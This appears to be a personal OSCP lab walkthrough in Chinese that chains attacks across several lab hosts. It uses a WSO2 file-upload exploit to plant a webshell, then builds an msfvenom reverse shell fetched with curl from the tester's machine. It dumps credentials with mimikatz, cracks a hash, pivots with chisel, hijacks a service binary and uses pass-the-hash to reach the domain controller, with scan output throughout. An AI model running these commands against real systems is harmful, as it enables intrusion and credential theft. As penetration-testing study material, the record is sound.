[+] 	752 methods were successfully parsed.
[+] Reading method candidates from internal wordlist rmiscout.txt
[+] 	2550 methods were successfully parsed.
[+]
[+] Listing successfully guessed methods:
[+]
[+] 	- jmxrmi
[+] 		--> java.lang.String getVersion()
[+] 		--> javax.management.remote.rmi.RMIConnection newClient(java.lang.Object arg)
```



![[Pasted image 20230909015206.png]]

[CVE-2022-29464](https://github.com/hakivvi/CVE-2022-29464)

發現 WS02 Carbon Server 有任意檔案上傳的漏洞，嘗試製作利用上傳 webshell
![[截圖 2023-09-09 上午1.53.08.png]]
```json
┌──(ouyang㉿kali)-[~/…/OSCP/Exam/101/CVE-2022-29464]
└─$ python3 exploit.py https://192.168.115.101:9443/ shell.jsp
shell @ https://192.168.115.101:9443//authenticationendpoint/shell.jsp
```
![[截圖 2023-09-08 上午10.04.57.png]]

![[截圖 2023-09-08 上午10.05.30.png]]

上傳後可成功利用 web shell (依照 exploit 給的路徑)

![[截圖 2023-09-08 上午10.06.11.png]]

嘗試製作 reverse shell 並透過 web shell 執行

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Exam/101]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.115 LPORT=9999 -f exe -o shell.exe
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

![[截圖 2023-09-08 上午10.07.21.png]]

kali:
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Exam/101]
└─$ python3 -m http.server 9443
Serving HTTP on 0.0.0.0 port 9443 (http://0.0.0.0:9443/) ...
```

靶機 webshell

```bash
curl http://192.168.49.115:9443/shell.exe --output shell.exe
```

![[截圖 2023-09-08 上午10.09.29.png]]

![[截圖 2023-09-08 上午10.12.44.png]]

![[Pasted image 20230908101022.png]]

![[截圖 2023-09-08 上午10.11.17.png]]

kali:
![[截圖 2023-09-08 上午10.12.09.png]]

get shell!

### 提權

上傳 winPEAS [github](https://github.com/carlospolop/PEASS-ng)
![[截圖 2023-09-08 上午10.19.36.png]]
![[截圖 2023-09-08 上午10.19.12.png]]

```json
����������͹ Logged users
    MS01\Administrator
    OSCP\Bob.Martin
    OSCP\Alice.Walters
����������͹ Ever logged users
    MS01\Administrator
    OSCP\Administrator
    OSCP\Bob.Martin
    OSCP\Alice.Walters

����������͹ Interesting Services -non Microsoft-
� Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    RemoteSystemMonitorService(TRIGONE Remote System Monitor Server)[C:\Program Files (x86)\TRIGONE\Remote System Monitor Server\RemoteSystemMonitorService.exe] - Auto - Running - isDotNet - No quotes and Space detected
   =================================================================================================
```

![[截圖 2023-09-08 上午10.24.52.png]]
![[截圖 2023-09-08 上午10.34.21.png]]

建立另一個 reverse shell

![[截圖 2023-09-08 上午10.30.14.png]]
![[Pasted image 20230908105733.png]]

提權成功！
![[截圖 2023-09-08 上午10.56.47.png]]
![[截圖 2023-09-08 上午10.58.24.png]]

## 102

在 101 上執行 mimikatz.exe，得到 Alice.Walters NTLM Hash，拿回 kali 爆破

![[截圖 2023-09-08 上午11.02.24.png]]

hashcat 得到明文密碼為 1q2w3e4r5t
![[截圖 2023-09-08 上午11.06.30.png]]
![[截圖 2023-09-08 上午11.05.35.png]]

嘗試用 xfreerdp 連線到 102，但要先建立 proxy
靶機下載 chisel.exe
![[截圖 2023-09-08 上午11.10.54.png]]

101:
![[截圖 2023-09-08 上午11.17.48.png]]

kali:
![[截圖 2023-09-08 上午11.18.06.png]]

建立 proxy 後嘗試 rdp

![[截圖 2023-09-08 上午11.17.06.png]]

![[截圖 2023-09-08 上午11.19.07.png]]

成功 get shell!

嘗試用 101 的 iis server 放置 winpeas & mimikatz，再透過 102 下載
![[截圖 2023-09-08 上午11.36.09.png]]
![[截圖 2023-09-08 上午11.38.55.png]]

```json
wmic service get name, pathname, displayname

mysql                                                                               mysql                                     C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
```

嘗試搜尋服務，並確認哪些位置為 everyone 可寫，發現 mysqld 可被寫入 (F 為完整存取)

![[截圖 2023-09-08 下午12.00.24.png]]

先建立一個讓 102 可以 reverse 回 101 的 shell file，上傳到 101 再讓 102 透過 web service 下載

![[截圖 2023-09-08 下午12.06.40.png]]

先把 102 的 mysqld.exe 移走
```json
move .\mysqld.exe C:\\Users\\Alice.Walters\\Desktop\\mysqld.exe
```

102: 在 C:\\xampp\\mysql\\bin 底下
```bash
curl http://172.16.115.101/reverse.exe --output reverse.exe

shutdown /r /t 0
```

102 提權成功！

![[截圖 2023-09-08 下午1.23.39.png]]


嘗試執行 mimikatz.exe

![[截圖 2023-09-08 下午2.06.01.png]]

發現 John.Howell 的 Credential
![[截圖 2023-09-08 下午2.06.46.png]]

並確認 John 是 domain admin
![[截圖 2023-09-08 下午2.07.46.png]]

## 100

嘗試用 psexec 帶 John 的 Hash 直接登入 DC

![[截圖 2023-09-08 下午2.11.57.png]]

成功 get shell!

![[截圖 2023-09-08 下午2.12.23.png]]

## 110

```json
PORT      STATE    SERVICE REASON
21/tcp    open     ftp     syn-ack
22/tcp    open     ssh     syn-ack
5846/tcp  filtered unknown no-response
17089/tcp filtered unknown no-response
18774/tcp filtered unknown no-response
20731/tcp filtered unknown no-response
28333/tcp filtered unknown no-response
46819/tcp filtered unknown no-response
60067/tcp filtered unknown no-response

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3606.76 seconds
```

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Exam]
└─$ sudo nmap -A -sC -T4 192.168.115.110
[sudo] ouyang 的密碼：
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-08 11:10 CST
Nmap scan report for 192.168.115.110
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0            4096 Jun 02 13:26 db
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.49.115
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 8b:81:8c:c9:d8:f9:8d:cf:94:04:98:57:a1:ea:69:c3 (ECDSA)
|_  256 51:8a:c9:94:5f:37:dd:34:fc:32:02:43:12:78:0f:d7 (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/8%OT=21%CT=1%CU=34106%PV=Y%DS=2%DC=T%G=Y%TM=64FA90DE
OS:%P=aarch64-unknown-linux-gnu)SEQ(SP=FF%GCD=1%ISR=107%TI=Z%II=I%TS=A)OPS(
OS:O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11
OS:NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUC
OS:K=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   229.95 ms 192.168.49.1
2   230.26 ms 192.168.115.110

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.64 seconds


┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Exam]
└─$ sudo nmap -A -sC -sU -T4 192.168.115.110
[sudo] ouyang 的密碼：
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-08 13:04 CST
Warning: 192.168.115.110 sudo nmap -A -sC -sU -T4 192.168.115.110giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.115.110
Host is up (0.22s latency).
Not shown: 985 closed udp ports (port-unreach)
PORT      STATE         SERVICE         VERSION
161/udp   open          snmp            net-snmp; net-snmp SNMPv3 server
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: a58fd418f819ea6300000000
|   snmpEngineBoots: 21
|_  snmpEngineTime: 5h25m50s
199/udp   open|filtered smux
998/udp   open|filtered puparp
1023/udp  open|filtered unknown
5555/udp  open|filtered rplay
8193/udp  open|filtered sophos
17946/udp open|filtered unknown
18449/udp open|filtered unknown
19075/udp open|filtered unknown
20031/udp open|filtered bakbonenetvault
21649/udp open|filtered unknown
29977/udp open|filtered unknown
33249/udp open|filtered unknown
34555/udp open|filtered unknown
49209/udp open|filtered unknown
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops

TRACEROUTE (using port 21923/udp)
HOP RTT       ADDRESS
1   226.52 ms 192.168.49.1
2   227.19 ms 192.168.115.110

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1201.26 seconds
```

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Exam/101]
└─$ sudo nmap -sU --script "snmp* and not snmp-brute" 192.168.115.110
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-08 14:25 CST
Nmap scan report for 192.168.115.110
Host is up (0.23s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: a58fd418f819ea6300000000
|   snmpEngineBoots: 21
|_  snmpEngineTime: 6h44m01s

Nmap done: 1 IP address (1 host up) scanned in 1017.25 seconds
```


Nmap 發現 ftp 可用 anonymous / anonymous 登入

![[截圖 2023-09-08 下午2.16.00.png]]

進去後發現有個 db 資料夾，拉回來看看

![[截圖 2023-09-08 下午2.17.55.png]]

得到一組帳密，但 ssh 無法登入，ftp 也無法
```json
student / secret%pass
```

![[截圖 2023-09-08 下午2.49.38.png]]

snmpbulkwalk 沒有回應
![[截圖 2023-09-08 下午6.35.14.png]]

![[截圖 2023-09-08 下午7.02.15.png]]

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Exam/110]
└─$ nmap --script ftp-* -p 21 192.168.115.110
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-08 18:52 CST
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
NSE: [ftp-brute] usernames: Time limit 10m00s exceeded.
NSE: [ftp-brute] usernames: Time limit 10m00s exceeded.
NSE: [ftp-brute] passwords: Time limit 10m00s exceeded.
Nmap scan report for 192.168.115.110
Host is up (0.22s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-brute:
|   Accounts: No valid accounts found
|_  Statistics: Performed 2915 guesses in 602 seconds, average tps: 4.7
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.49.115
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0            4096 Jun 02 13:26 db

Nmap done: 1 IP address (1 host up) scanned in 603.15 seconds
```

用 onesixtyone 嘗試爆破 community string

```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Exam/110]
└─$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 192.168.115.110 -w 100
Scanning 1 hosts, 121 communities
192.168.115.110 [security] Linux oscp 5.15.0-60-generic #66-Ubuntu SMP Fri Jan 20 14:29:49 UTC 2023 x86_64
```
![[截圖 2023-09-08 下午7.16.54.png]]

使用 snmpwalk 列舉
```json
┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Exam/110]
└─$ snmpwalk 192.168.115.110 -c security -v 2c > snmpwalk.txt
```

![[截圖 2023-09-08 下午8.10.09.png]]

使用 snmpbulk 列舉

```bash
snmpbulkwalk -c security -v2c 192.168.115.110 . > snmpbulkwalk.txt

cat snmpbulkwalk.txt | grep -i string
```

![[Pasted image 20230909011413.png]]

用此 credential 來 ssh 

![[截圖 2023-09-09 上午2.10.17.png]]
![[Pasted image 20230909011003.png]]


上傳 linpeas.sh 嘗試確認能否提權

![[截圖 2023-09-09 上午1.16.00.png]]

```json
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: probable
   Tags: [ ubuntu=(22.04) ]{kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

```

## 112
### Nmap

```json
PORT     STATE SERVICE       REASON
21/tcp   open  ftp           syn-ack
80/tcp   open  http          syn-ack
443/tcp  open  https         syn-ack
3389/tcp open  ms-wbt-server syn-ack
8080/tcp open  http-proxy    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 666.60 seconds


┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Exam]
└─$ sudo nmap -A -sC -T4 192.168.115.112 -p 21,80,443,3389,8080
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-08 11:12 CST
Nmap scan report for 192.168.115.112
Host is up (0.22s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http          Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
|_http-title: Home
|_http-generator: Nicepage 4.12.17, nicepage.com
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
443/tcp  open  http          Apache httpd 2.4.51 (PHP/7.4.26)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Home
|_http-generator: Nicepage 4.12.21, nicepage.com
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=OSCP
| Not valid before: 2023-09-07T00:00:26
|_Not valid after:  2024-03-08T00:00:26
| rdp-ntlm-info:
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: OSCP
|   DNS_Computer_Name: OSCP
|   Product_Version: 10.0.19041
|_  System_Time: 2023-09-08T03:13:11+00:00
|_ssl-date: 2023-09-08T03:13:40+00:00; 0s from scanner time.
8080/tcp open  http          Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Home
|_http-generator: Nicepage 4.12.21, nicepage.com
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|7 (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   217.88 ms 192.168.49.1
2   218.36 ms 192.168.115.112

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.20 seconds

┌──(ouyang㉿kali)-[~/offensive-security/OSCP/Exam/112]
└─$ nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 192.168.115.112
Starting Nmap 7.92 ( https://nmap.org ) at 2023-09-08 23:02 CST
Nmap scan report for 192.168.115.112
Host is up (0.23s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
| rdp-ntlm-info:
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: OSCP
|   DNS_Computer_Name: OSCP
|   Product_Version: 10.0.19041
|_  System_Time: 2023-09-08T15:02:10+00:00
| rdp-enum-encryption:
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|_    RDSTLS: SUCCESS

Nmap done: 1 IP address (1 host up) scanned in 4.93 seconds
```

![[截圖 2023-09-08 下午3.41.33.png]]

ftp 可用 anonymous 成功登入！

![[截圖 2023-09-08 下午2.42.37.png]]

其中只有 Report.pdf 打得開

![[截圖 2023-09-08 下午5.11.56.png]]
### Dirsearch

```json
┌──(ouyang㉿kali)-[~/…/OSCP/Exam/112/dirsearch]
└─$ dirsearch -u http://192.168.115.112/ -e *

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 30 | Wordlist size: 15490

Output File: /home/ouyang/.dirsearch/reports/192.168.115.112/-_23-09-08_16-22-16.txt

Error Log: /home/ouyang/.dirsearch/logs/errors-23-09-08_16-22-16.log

Target: http://192.168.115.112/

[16:22:17] Starting:
[16:22:21] 403 -  290B  - /%C0%AE%C0%AE%C0%AF
[16:22:21] 403 -  290B  - /%3f/
[16:22:23] 403 -  290B  - /%ff
[16:22:30] 403 -  290B  - /.htaccess.bak1
[16:22:30] 403 -  290B  - /.ht_wsr.txt
[16:22:30] 403 -  290B  - /.htaccess.save
[16:22:30] 403 -  290B  - /.htaccess.sample
[16:22:30] 403 -  290B  - /.htaccess_extra
[16:22:30] 403 -  290B  - /.htaccess_orig
[16:22:30] 403 -  290B  - /.htaccess.orig
[16:22:30] 403 -  290B  - /.htaccess_sc
[16:22:30] 403 -  290B  - /.htaccessBAK
[16:22:30] 403 -  290B  - /.htaccessOLD
[16:22:30] 403 -  290B  - /.htaccessOLD2
[16:22:30] 403 -  290B  - /.htm
[16:22:30] 403 -  290B  - /.html
[16:22:30] 403 -  290B  - /.htpasswd_test
[16:22:31] 403 -  290B  - /.htpasswds
[16:22:31] 403 -  290B  - /.httr-oauth
[16:22:40] 200 -    0B  - /About
[16:22:47] 403 -  290B  - /Trace.axd::$DATA
[16:22:53] 200 -    0B  - /about
[16:22:53] 200 -    9KB - /about.html
[16:23:23] 403 -  290B  - /adminer/adminer.php
[16:23:23] 403 -  290B  - /adminer/
[16:23:43] 403 -  290B  - /cgi-bin/
[16:23:44] 500 -  633B  - /cgi-bin/printenv.pl
[16:23:49] 200 -    0B  - /contact
[16:23:49] 200 -    9KB - /contact.html
[16:24:12] 200 -   37KB - /home
[16:24:12] 200 -   45KB - /home.html
[16:24:14] 301 -  329B  - /images  ->  http://192.168.115.112/images/
[16:24:16] 200 -   44KB - /index
[16:24:16] 200 -   44KB - /index.html
[16:24:16] 403 -  290B  - /index.php::$DATA
[16:24:17] 200 -    4KB - /images/
[16:24:45] 403 -  290B  - /phpmyadmin/doc/html/index.html
[16:24:45] 403 -  290B  - /phpmyadmin/docs/html/index.html
[16:24:45] 403 -  290B  - /phpmyadmin/ChangeLog
[16:24:45] 403 -  290B  - /phpmyadmin/README
[16:24:46] 403 -  290B  - /phpmyadmin
[16:24:49] 403 -  290B  - /phpmyadmin/
[16:24:49] 403 -  290B  - /phpmyadmin/index.php
[16:24:49] 403 -  290B  - /phpmyadmin/phpmyadmin/index.php
[16:24:49] 403 -  290B  - /phpmyadmin/scripts/setup.php
[16:24:50] 403 -  290B  - /phpsysinfo/
[16:25:25] 403 -  290B  - /web.config::$DATA


┌──(ouyang㉿kali)-[~/…/OSCP/Exam/112/dirsearch]
└─$ dirsearch -u http://192.168.115.112:443/ -e *

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 30 | Wordlist size: 15490

Output File: /home/ouyang/.dirsearch/reports/192.168.115.112-443/-_23-09-08_16-22-53.txt

Error Log: /home/ouyang/.dirsearch/logs/errors-23-09-08_16-22-53.log

Target: http://192.168.115.112:443/

[16:22:54] Starting:
[16:22:59] 403 -  291B  - /%3f/
[16:22:59] 403 -  291B  - /%C0%AE%C0%AE%C0%AF
[16:23:00] 403 -  291B  - /%ff
[16:23:05] 403 -  291B  - /.ht_wsr.txt
[16:23:06] 403 -  291B  - /.htaccess.bak1
[16:23:06] 403 -  291B  - /.htaccess.sample
[16:23:06] 403 -  291B  - /.htaccess_sc
[16:23:06] 403 -  291B  - /.htpasswd_test
[16:23:06] 403 -  291B  - /.htpasswds
[16:23:06] 403 -  291B  - /.httr-oauth
[16:23:06] 403 -  291B  - /.htaccessOLD2
[16:23:06] 403 -  291B  - /.htaccess.orig
[16:23:06] 403 -  291B  - /.htaccessBAK
[16:23:06] 403 -  291B  - /.htm
[16:23:06] 403 -  291B  - /.htaccessOLD
[16:23:06] 403 -  291B  - /.htaccess_extra
[16:23:06] 403 -  291B  - /.htaccess_orig
[16:23:06] 403 -  291B  - /.htaccess.save
[16:23:06] 403 -  291B  - /.html
[16:23:16] 200 -    0B  - /About
[16:23:23] 403 -  291B  - /Trace.axd::$DATA
[16:23:29] 200 -    5KB - /about.html
[16:23:29] 200 -    0B  - /about
[16:24:00] 403 -  291B  - /adminer/adminer.php
[16:24:00] 403 -  291B  - /adminer/
[16:24:23] 403 -  291B  - /cgi-bin/
[16:24:23] 500 -  634B  - /cgi-bin/printenv.pl
[16:24:29] 200 -    0B  - /contact
[16:24:29] 200 -    5KB - /contact.html
[16:24:49] 200 -    2KB - /home
[16:24:49] 200 -    6KB - /home.html
[16:24:51] 301 -  334B  - /images  ->  http://192.168.115.112:443/images/
[16:24:51] 200 -  976B  - /images/
[16:24:52] 200 -    6KB - /index
[16:24:53] 200 -    6KB - /index.html
[16:24:53] 403 -  291B  - /index.php::$DATA
[16:25:18] 403 -  291B  - /phpmyadmin/ChangeLog
[16:25:19] 403 -  291B  - /phpmyadmin/doc/html/index.html
[16:25:19] 403 -  291B  - /phpmyadmin/docs/html/index.html
[16:25:19] 403 -  291B  - /phpmyadmin/README
[16:25:20] 403 -  291B  - /phpmyadmin
[16:25:22] 403 -  291B  - /phpmyadmin/
[16:25:22] 403 -  291B  - /phpmyadmin/index.php
[16:25:22] 403 -  291B  - /phpmyadmin/scripts/setup.php
[16:25:22] 403 -  291B  - /phpmyadmin/phpmyadmin/index.php
[16:25:23] 403 -  291B  - /phpsysinfo/
[16:25:50] 403 -  291B  - /web.config::$DATA

┌──(ouyang㉿kali)-[~/…/OSCP/Exam/112/dirsearch]
└─$ dirsearch -u http://192.168.115.112:8080/ -e *

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 30 | Wordlist size: 15490

Output File: /home/ouyang/.dirsearch/reports/192.168.115.112-8080/-_23-09-08_16-23-39.txt

Error Log: /home/ouyang/.dirsearch/logs/errors-23-09-08_16-23-39.log

Target: http://192.168.115.112:8080/

[16:23:39] Starting:
[16:23:44] 403 -  292B  - /%C0%AE%C0%AE%C0%AF
[16:23:44] 403 -  292B  - /%3f/
[16:23:45] 403 -  292B  - /%ff
[16:23:51] 403 -  292B  - /.ht_wsr.txt
[16:23:51] 403 -  292B  - /.htaccess.bak1
[16:23:51] 403 -  292B  - /.htaccess.sample
[16:23:51] 403 -  292B  - /.htaccess.orig
[16:23:51] 403 -  292B  - /.htaccess.save
[16:23:51] 403 -  292B  - /.htaccess_orig
[16:23:51] 403 -  292B  - /.htaccess_extra
[16:23:51] 403 -  292B  - /.htaccess_sc
[16:23:51] 403 -  292B  - /.htm
[16:23:51] 403 -  292B  - /.htaccessOLD2
[16:23:51] 403 -  292B  - /.htaccessOLD
[16:23:51] 403 -  292B  - /.htpasswd_test
[16:23:51] 403 -  292B  - /.htaccessBAK
[16:23:51] 403 -  292B  - /.htpasswds
[16:23:52] 403 -  292B  - /.httr-oauth
[16:23:52] 403 -  292B  - /.html
[16:24:04] 200 -    0B  - /About
[16:24:11] 403 -  292B  - /Trace.axd::$DATA
[16:24:16] 200 -    0B  - /about
[16:24:16] 200 -    5KB - /about.html
[16:24:48] 403 -  292B  - /adminer/
[16:24:48] 403 -  292B  - /adminer/adminer.php
[16:25:09] 403 -  292B  - /cgi-bin/
[16:25:09] 500 -  635B  - /cgi-bin/printenv.pl
[16:25:15] 200 -    0B  - /contact
[16:25:15] 200 -    5KB - /contact.html
[16:25:36] 200 -    2KB - /home
[16:25:36] 200 -    6KB - /home.html
[16:25:37] 301 -  336B  - /images  ->  http://192.168.115.112:8080/images/
[16:25:37] 200 -  977B  - /images/
[16:25:38] 200 -    6KB - /index
[16:25:38] 200 -    6KB - /index.html
[16:25:38] 403 -  292B  - /index.php::$DATA
[16:25:56] 403 -  292B  - /phpmyadmin/docs/html/index.html
[16:25:56] 403 -  292B  - /phpmyadmin/README
[16:25:56] 403 -  292B  - /phpmyadmin/doc/html/index.html
